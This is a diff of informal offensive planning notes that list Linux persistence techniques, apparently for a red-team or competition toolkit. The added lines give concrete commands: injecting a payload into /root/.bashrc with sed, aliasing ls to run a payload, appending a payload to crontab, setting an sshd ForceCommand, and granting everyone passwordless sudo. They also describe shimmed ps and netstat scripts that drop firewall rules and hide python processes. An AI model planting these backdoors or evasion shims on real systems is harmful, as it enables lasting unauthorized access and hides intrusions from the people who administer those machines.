@@ -19,16 +19,33 @@ Deploy setting
 ===============================================================================
 Payload lists 
 
+Should probably parse all the user in the system 
+
 1. .bashrc
-2. alias -->  
+    - sed -i '<linenum> a <payload>' /root/.bashrc
+        - I mean this works, but it only appends to root
+2. alias 
+    - ls --> ls; <payload> 
+    
 3. shimmed binaries 
+    - ps, netstat   --> drop iptables + grep -v python
+    - The "shimmed" binary (bash_script) will simply drop firewall rule, run ps + grep -v python 
+    - So the shim in this case doesn't need to be a c compiled file <-- Even tho it might be better... 
+
 4. cronjob 
+    - crontab -l | { cat; echo "<payload>"; } | crontab -
+
 5. bash logout 
+    - 
+
 6. service 
+    - https://medium.com/@benmorel/creating-a-linux-service-with-systemd-611b5c8b91d6
+    
 7. Just run the god damn binary dude 
 8. Webshell pog? 
 
 9. SSH Misconfiguration --> Overwrite sshdconfig 
+    - ForceCommand "<payload>"
 10. PAM backdoor 
 11. SSH key? POG? 
 12. sudoers backdoor (ex. ALL ALL=(ALL)NOPASSWD:ALL >> /etc/sudoers 
